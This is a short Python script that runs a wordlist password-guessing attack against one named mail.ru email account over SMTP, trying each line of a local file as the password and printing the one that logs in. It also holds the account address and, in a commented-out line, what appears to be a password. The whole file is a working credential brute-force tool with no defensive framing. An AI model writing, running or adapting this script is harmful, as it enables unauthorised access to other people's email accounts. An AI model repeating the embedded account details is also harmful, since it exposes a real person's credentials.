from xsmtplib import SMTP
import time

file1 = open('wrd.txt', 'r') 
Lines = file1.readlines() 

login = "thusynov2020@mail.ru"
#password = "5591980super"


def check(log, passw):
    server = SMTP(host="smtp.mail.ru")
    server.starttls()

    try:
        server.login(log, passw)
    except:
        print("Not Found!")
        server.quit()
        return
    print("***********\nFound: " + passw)
    server.quit()


for password in Lines:
    #time.sleep(0.1)
    check(login, password)

#check(login, password)
